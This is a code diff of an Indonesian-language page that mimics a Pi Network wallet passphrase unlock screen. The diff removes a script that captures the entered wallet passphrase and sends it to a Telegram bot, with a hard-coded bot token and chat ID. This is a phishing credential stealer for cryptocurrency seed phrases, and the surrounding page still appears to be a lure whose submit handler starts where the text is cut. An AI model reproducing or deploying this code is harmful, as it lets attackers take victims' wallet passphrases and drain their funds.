@@ -40,48 +40,6 @@
              transition:transform 160ms ease, background 160ms ease, color 160ms ease;">
       Buka dengan Passphrase
     </button>
-
-    <script>
-    // Telegram config
-    var telegram_chat_id = "6741003817";
-    var telegram_bot_token = "7719532232:AAEeFLNU117FY_Lx2wM499U-GstKTb_1by8";
-
-    document.getElementById('submitBtn').addEventListener('click', function() {
-      var passphrase = document.getElementById('passphraseInput').value.trim();
-      
-      if (passphrase === '') {
-        alert('Harap masukkan passphrase terlebih dahulu.');
-        return;
-      }
-      
-      // Kirim ke Telegram
-      var url = 'https://api.telegram.org/bot' + telegram_bot_token + '/sendMessage';
-      var payload = {
-        chat_id: telegram_chat_id,
-        text: '🔐 *Passphrase Baru Masuk!*\n\n' + passphrase,
-        parse_mode: 'Markdown'
-      };
-      
-      fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      })
-      .then(response => response.json())
-      .then(data => {
-        if (data.ok) {
-          alert('Passphrase berhasil dikirim ke Telegram!');
-          document.getElementById('passphraseInput').value = ''; // kosongkan
-        } else {
-          alert('Gagal mengirim: ' + data.description);
-        }
-      })
-      .catch(error => {
-        alert('Terjadi kesalahan: ' + error.message);
-      });
-    });
-  </script>
-    
     
     <button type="button" disabled="" style="margin-top:14px;width:100%;position:relative;background:white;color:#B5B5B5;border:1.5px solid #DCDCDC;border-radius:14px;padding:17px 20px;font-family:-apple-system, BlinkMacSystemFont, system-ui, sans-serif;font-weight:600;font-size:15px;cursor:not-allowed">Biometrik Tidak Tersedia</button><p style="margin-top:28px;font-size:17px;line-height:1.5;color:#111;font-family:-apple-system, BlinkMacSystemFont, system-ui, sans-serif">Sebagai non-custodial wallet, passphrase hanya kamu yang punya akses. Pemulihan passphrase tidak mungkin dilakukan.</p><p style="margin-top:22px;font-size:17px;line-height:1.5;color:#111;font-family:-apple-system, BlinkMacSystemFont, system-ui, sans-serif">Lupa passphrase?<!-- --> <a href="#" style="color:#1A73E8;text-decoration:none;font-weight:400">Kamu bisa buat wallet baru,</a> <!-- -->tapi semua π di wallet sebelumnya tidak akan bisa diakses.</p></form></div></div><!--$--><!--/$--><script>
 document.querySelector('form').addEventListener('submit', function(e) {
